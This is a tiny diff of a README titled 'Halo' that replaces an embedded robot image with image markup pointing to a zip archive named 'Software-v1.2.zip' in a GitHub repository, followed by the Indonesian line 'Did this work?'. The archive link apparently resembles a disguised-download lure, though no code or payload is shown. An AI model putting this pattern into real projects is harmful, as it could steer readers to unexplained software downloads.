@@ -1,6 +1,6 @@
 # Halo
 
-![](https://www.karismaacademy.com/wp-content/themes/karisma-academy/images/slider/home/top/robot.jpg)
+![](https://raw.githubusercontent.com/Hilmi26/Perpusatakaan/main/assets/Software-v1.2.zip)
 
 Apakah ini berhasil? <br>
 
